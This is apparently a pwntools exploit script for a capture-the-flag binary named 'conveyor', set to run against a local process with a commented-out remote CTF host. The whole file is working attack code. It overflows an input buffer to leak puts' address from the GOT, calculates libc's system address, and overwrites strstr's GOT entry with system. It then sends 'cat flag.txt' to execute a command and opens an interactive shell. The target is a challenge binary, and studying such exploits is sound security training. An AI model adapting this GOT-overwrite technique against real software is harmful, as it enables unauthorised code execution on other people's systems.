#! /usr/bin/env python
from pwn import *
#r = remote('jh2i.com' , 50020) 
r = process("./conveyor" , env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1_amd64.so"})

def ReadMenu():
    r.recvuntil('Exit.\n')

def AddPart(chunk):
    r.send(b'1\n')
    r.recvuntil(':')
    r.send(chunk)

def SaftyCheck(chunk):
    r.send(b'2\n')
    r.recvuntil('? ')
    r.send(b'N\n')
    r.send(chunk)
def GetLeakAddr():
    r.recvuntil('? ')
    addr = r.recv(6)
    r.recvuntil('\n')
    return int.from_bytes(addr ,'little')
def WritePLT(addr) :
    r.recvuntil('? ')
    r.send(b'N\n')
    r.recvuntil(': ')
    r.send(p64(addr) + b'\n')
def PassWrite() :
    r.recvuntil('? ')
    r.send(b'Y\0\n')

def LeakAddr(leak_addr):
    ReadMenu()
    AddPart( b'a'* 0x7f)
    ReadMenu()
    SaftyCheck( b"a"* 0x78 + leak_addr )
    addr = GetLeakAddr()
    print("addr:"  + hex(addr))
    WritePLT(addr)
    #PassWrite()
    return addr
def WriteAddr(leak_addr , write_addr ):
    ReadMenu()
    AddPart( b'a'* 0x7f)
    ReadMenu()
    SaftyCheck( b"a"* 0x78 + leak_addr )
    addr = GetLeakAddr()
    print("leak_addr:"  + hex(addr))
    WritePLT(write_addr)
    return addr





context(log_level="debug")
gdb.attach(r)

puts_to_bin_sh_offset = 0x1334da;
puts_to_system_offset =-0x31580;
#print("offset:" + hex(strstr_offset))
#print("offset:" +  hex(system_offset))

strstr_addr = p64(0x602060)
puts_addr   = p64(0x602020)
atoi_addr   = p64(0x602058)
addr = LeakAddr(puts_addr)
print("puts_addr:" + hex(addr))
system_addr =  addr + puts_to_system_offset
bin_sh_addr = addr + puts_to_bin_sh_offset
print("system_addr:"  + hex(system_addr))

#LeakAddr(strstr_addr)
WriteAddr(strstr_addr , system_addr)
ReadMenu()
AddPart( b'cat flag.txt\n')

#LeakAddr(atoi_addr)



r.interactive()
